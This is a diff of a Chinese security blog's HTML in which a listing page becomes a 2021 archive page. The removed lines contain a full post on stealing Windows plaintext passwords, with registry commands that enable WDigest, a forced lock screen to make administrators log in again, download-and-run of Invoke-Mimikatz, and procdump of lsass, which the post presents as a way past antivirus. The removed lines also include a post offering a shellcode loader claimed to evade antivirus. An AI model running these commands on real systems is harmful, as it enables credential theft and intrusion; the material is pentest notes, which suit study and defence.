@@ -15,15 +15,12 @@
 <meta name="baidu-site-verification" content="elXpeED2jg">
 
 
-    
-    
-
 
 <meta name="description" content="记录安全相关的琐碎">
 <meta name="keywords" content="安全 编程 开发 博客">
 <meta property="og:type" content="website">
 <meta property="og:title" content="Jayl1n&#39;s Blog">
-<meta property="og:url" content="https://jayl1n.github.io/page/2/index.html">
+<meta property="og:url" content="https://jayl1n.github.io/archives/2021/index.html">
 <meta property="og:site_name" content="Jayl1n&#39;s Blog">
 <meta property="og:description" content="记录安全相关的琐碎">
 <meta property="og:locale" content="zh-Hans">
@@ -57,13 +54,11 @@
 <link rel="stylesheet" href="../../css/style.css">
 
 
-    <style> .article { opacity: 0;} </style>
-
 
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>Jayl1n&#39;s Blog</title>
+<title>Archives: 2021 | Jayl1n&#39;s Blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -72,9 +67,9 @@
     var yiliaConfig = {
         fancybox: true,
         animate: true,
-        isHome: true,
+        isHome: false,
         isPost: false,
-        isArchive: false,
+        isArchive: true,
         isTag: false,
         isCategory: false,
         fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
@@ -292,409 +287,54 @@
 </nav>
       <div class="body-wrap">
   
-    <article id="post-pentest-getpassword" class="article article-type-post" itemscope itemprop="blogPost">
   
-    <div class="article-meta">
-      <a href="../../2019/03/29/pentest-getpassword/" class="article-date">
-      <time datetime="2019-03-29T11:32:22.000Z" itemprop="datePublished">2019-03-29</time>
+    
+    
+      
+      
+      <section class="archives-wrap">
+        <div class="archive-year-wrap">
+          <a href="" class="archive-year">2021</a>
+        </div>
+        <div class="archives">
+    
+    <article class="archive-article archive-type-post">
+  <div class="archive-article-inner">
+    <header class="archive-article-header">
+          <div class="article-meta">
+              <a href="../../2021/01/03/compile-virtualbox-on-macos10-15/" class="archive-article-date">
+      <time datetime="2021-01-03T08:23:34.000Z" itemprop="datePublished">01-03</time>
 </a>
 
 
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
+        </div>
+         
   
     <h1 itemprop="name">
-      <a class="article-title" href="../../2019/03/29/pentest-getpassword/">Windows下抓取明文密码</a>
+      <a class="archive-article-title" href="../../2021/01/03/compile-virtualbox-on-macos10-15/">MacOS 下编译 VirtualBox</a>
     </h1>
   
 
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
+        <div class="article-info info-on-archive">
           
-        <h1 id="关于-KB2871997"><a href="#关于-KB2871997" class="headerlink" title="关于 KB2871997"></a>关于 KB2871997</h1><p>在 <code>KB2871997</code> 之前， Mimikatz 可以直接抓取明文密码。</p>
-<p>当服务器安装 <code>KB2871997</code> 补丁后，系统默认禁用 <code>Wdigest Auth</code> ，内存（lsass进程）不再保存明文口令。Mimikatz 将读不到密码明文。<br>但由于一些系统服务需要用到 <code>Wdigest Auth</code>，所以该选项是可以手动开启的。（开启后，需要用户重新登录才能生效）</p>
-<p>以下是支持的系统:</p>
-<ul>
-<li>Windows 7</li>
-<li>Windows 8</li>
-<li>Windows 8.1</li>
-<li>Windows Server 2008</li>
-<li>Windows Server 2012</li>
-<li>Windows Server 2012R 2</li>
-</ul>
-<h2 id="开启"><a href="#开启" class="headerlink" title="开启"></a>开启</h2><ul>
-<li><p>cmd</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>powershell</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>meterpreter</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogonCredential -t REG_DWORD -d 1</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<h2 id="关闭"><a href="#关闭" class="headerlink" title="关闭"></a>关闭</h2><ul>
-<li><p>cmd</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>powershell</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 0</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>meterpreter</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogonCredential -t REG_DWORD -d 0</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<h1 id="强制锁屏"><a href="#强制锁屏" class="headerlink" title="强制锁屏"></a>强制锁屏</h1><p>在开启 <code>Wdigest Auth</code> 后，需要管理员重新登录才能逮到明文密码。</p>
-<p>我们可以强制锁屏，让管理员重新登录。</p>
-<ul>
-<li><p>cmd</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32 user32.dll,LockWorkStation</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>powershell</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -c &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/kiraly15/Lock-WorkStation/master/Lock-WorkStation.ps1&apos;);&quot;</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<blockquote>
-<p>经测试 Win10企业版 仅锁屏读明文失败，需要注销才行，其它版本未知。</p>
-</blockquote>
-<h1 id="抓取明文"><a href="#抓取明文" class="headerlink" title="抓取明文"></a>抓取明文</h1><p>开启 <code>Wdigest Auth</code> 后，接下来就用常规的抓取明文的方式就行了。</p>
-<h2 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h2><ol>
-<li><p>powershell</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&apos;);Invoke-Mimikatz</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>exe</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
-</li>
-</ol>
-<h2 id="离线抓取"><a href="#离线抓取" class="headerlink" title="离线抓取"></a>离线抓取</h2><p>当 <code>Mimikatz</code> 被杀，可以先将 <code>lsass</code> 进程 <code>dump</code> 下来，在本地用 <code>Mimikatz</code> 读取。</p>
-<ol>
-<li><p>Dump 进程</p>
-<p>可以用微软提供的 <a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump" target="_blank" rel="noopener"><code>procdump</code></a> ，自带微软签名，可以过杀软。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>Mimikatz 读取</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::minidump lsass.dmp</span><br><span class="line">sekurlsa::logonPasswords full</span><br></pre></td></tr></table></figure></li>
-</ol>
 
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
+          
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="../../tags/Pentest/">Pentest</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="../../tags/开发/">开发</a></li></ul>
     </div>
 
-      
-      <div class="clearfix"></div>
-    </div>
-    
+        </div>
+        <div class="clearfix"></div>
+    </header>
   </div>
-  
 </article>
-
-
-
-
-
-
-
-
-
   
-    <article id="post-tools-load-shellcode" class="article article-type-post" itemscope itemprop="blogPost">
   
-    <div class="article-meta">
-      <a href="../../2019/01/08/tools-load-shellcode/" class="article-date">
-      <time datetime="2019-01-08T07:08:15.000Z" itemprop="datePublished">2019-01-08</time>
-</a>
-
-
-    </div>
+    </div></section>
   
-  <div class="article-inner">
+
     
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="../../2019/01/08/tools-load-shellcode/">【GSL】 从内存加载 SHELLCODE 绕过AV查杀</a>
-    </h1>
-  
 
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-              <p>根据 <a href="https://github.com/brimstone/go-shellcode" target="_blank" rel="noopener">go-shellcode</a> 修改，原作者用命令行传 SHELLCODE 的方式有点麻瓜，所以修改了一番。</p>
-<p>亲测可绕 360全家桶。</p>
-<p>X86 &amp; X64 的 SHELLCODE 都可以，用对应 <code>gsl</code> 加载就行了。</p>
-<p>下载：【<a href="https://github.com/Jayl1n/jayl1n.github.io/releases/download/0.1/gsl32.exe" target="_blank" rel="noopener">X86</a>】 【<a href="https://github.com/Jayl1n/jayl1n.github.io/releases/download/0.1/gsl64.exe" target="_blank" rel="noopener">X64</a>】</p>
-<blockquote>
-<p>为减小体积，已用 UPX 加壳压缩。</p>
-</blockquote>
-          
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="../../tags/工具分享/">工具分享</a></li></ul>
-    </div>
-
-      
-        <p class="article-more-link">
-          <a href="../../2019/01/08/tools-load-shellcode/#more">阅读全文 >></a>
-        </p>
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-java-audit-step-by-step-4" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="../../2018/12/30/java-audit-step-by-step-4/" class="article-date">
-      <time datetime="2018-12-29T16:17:42.000Z" itemprop="datePublished">2018-12-30</time>
-</a>
-
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="../../2018/12/30/java-audit-step-by-step-4/">从1开始的Java代码审计·第四弹·SSRF</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-              <blockquote>
-<p>最近的事情真的太多了 <strong>≧﹏≦</strong> ，趁着刚搞完小组的面试，发篇热乎的。</p>
-</blockquote>
-          
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="../../tags/Java/">Java</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="../../tags/代码审计/">代码审计</a></li></ul>
-    </div>
-
-      
-        <p class="article-more-link">
-          <a href="../../2018/12/30/java-audit-step-by-step-4/#more">阅读全文 >></a>
-        </p>
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-java-audit-step-by-step-3" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="../../2018/11/15/java-audit-step-by-step-3/" class="article-date">
-      <time datetime="2018-11-15T15:47:52.000Z" itemprop="datePublished">2018-11-15</time>
-</a>
-
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="../../2018/11/15/java-audit-step-by-step-3/">从1开始的Java代码审计·第三弹·SQL注入</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-              <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>SQL注入是什么，有什么用，就不多介绍了。总结下漏洞的原因，主要是由于开发者对用户的输入没有做好过滤，直接将用户的输入带入到 SQL语句中，导致恶意用户可以控制服务器执行的SQL语句。</p>
-<p>在 Java 中，操作SQL的主要有以下几种方式：</p>
-<ol>
-<li><p><code>java.sql.Statement</code></p>
-</li>
-<li><p><code>java.sql.PrepareStatement</code></p>
-</li>
-<li><p>使用第三方 <code>ORM</code> 框架 —— <code>MyBatis</code> 或 <code>Hibernate</code></p>
-</li>
-</ol>
-<p>下面我们来分析以上几种执行SQL的方式。</p>
-          
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="../../tags/Java/">Java</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="../../tags/代码审计/">代码审计</a></li></ul>
-    </div>
-
-      
-        <p class="article-more-link">
-          <a href="../../2018/11/15/java-audit-step-by-step-3/#more">阅读全文 >></a>
-        </p>
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-java-audit-step-by-step-2" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="../../2018/10/29/java-audit-step-by-step-2/" class="article-date">
-      <time datetime="2018-10-29T05:45:39.000Z" itemprop="datePublished">2018-10-29</time>
-</a>
-
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="../../2018/10/29/java-audit-step-by-step-2/">从1开始的Java代码审计·第二弹·基础篇（下）</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-              <p>我们在审计一个项目的时候，最开始应该是先熟悉项目的结构，了解项目的技术栈。</p>
-<p>本篇，我会引入一个开源的 Java Web 项目，通过实例分析 Java Web 的项目结构，常用的 MVC 模式。</p>
-          
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="../../tags/Java/">Java</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="../../tags/代码审计/">代码审计</a></li></ul>
-    </div>
-
-      
-        <p class="article-more-link">
-          <a href="../../2018/10/29/java-audit-step-by-step-2/#more">阅读全文 >></a>
-        </p>
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-  
-    <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="../../">&laquo; Prev</a><a class="page-number" href="../../">1</a><span class="page-number current">2</span><a class="page-number" href="../3/">3</a><a class="page-number" href="../4/">4</a><a class="extend next" rel="next" href="../3/">Next &raquo;</a>
-    </nav>
-  
 </div>
       <footer id="footer">
     <div class="outer">
